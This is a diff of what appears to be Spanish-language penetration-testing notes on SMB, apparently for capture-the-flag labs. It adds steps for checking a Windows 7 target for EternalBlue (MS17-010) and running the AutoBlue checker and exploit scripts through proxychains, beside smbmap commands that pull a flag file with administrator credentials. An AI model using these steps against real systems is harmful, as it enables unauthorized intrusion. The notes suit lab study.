@@ -59,6 +59,13 @@ smbmap -u Administrator -p "smbserver_771" -H target --download 'C$\flag.txt'
 
 ### SMBClient - ftp-like client to access SMB/CIFS resources on servers.
 
+Windows 7 y smb puede ser un Eternalblue.
+
+-> AutoBlue-Ms17-010
+
+1: eternal_checker.py target
+2: proxychains python2.7 zzz_exploit.py target
+
 ```bash
 $nmbloopup -A taget
 
